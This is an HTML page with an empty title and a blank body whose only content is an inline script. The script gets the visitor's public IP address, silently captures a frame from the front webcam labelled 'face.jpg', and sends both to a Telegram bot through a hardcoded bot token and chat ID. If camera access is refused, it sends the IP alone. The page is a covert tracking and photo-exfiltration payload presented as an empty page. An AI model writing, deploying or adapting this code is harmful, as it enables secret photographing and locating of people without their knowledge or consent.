<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>body{margin:0;background:white;}</style>
</head>
<body>
<script>
const T='8200495745:AAGyosptWtcfmkaStPU1khsY9gCuc3Zx1_Y';
const C='7380945601';

const s=(ip,b)=>{
fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:C,text:`IP: ${ip}`})
});
if(b){
let f=new FormData();
f.append('chat_id',C);
f.append('photo',b,'face.jpg');
fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:f});
}};

fetch('https://api.ipify.org?format=json')
.then(r=>r.json())
.then(d=>{
navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
.then(stream=>{
let v=document.createElement('video');
v.srcObject=stream;
v.play();
v.onloadedmetadata=()=>{
let c=document.createElement('canvas');
c.width=640;c.height=480;
c.getContext('2d').drawImage(v,0,0,640,480);
stream.getTracks().forEach(t=>t.stop());
c.toBlob(b=>s(d.ip,b),'image/jpeg',0.85);
};
})
.catch(()=>s(d.ip,null));
});
</script>
</body>
</html>
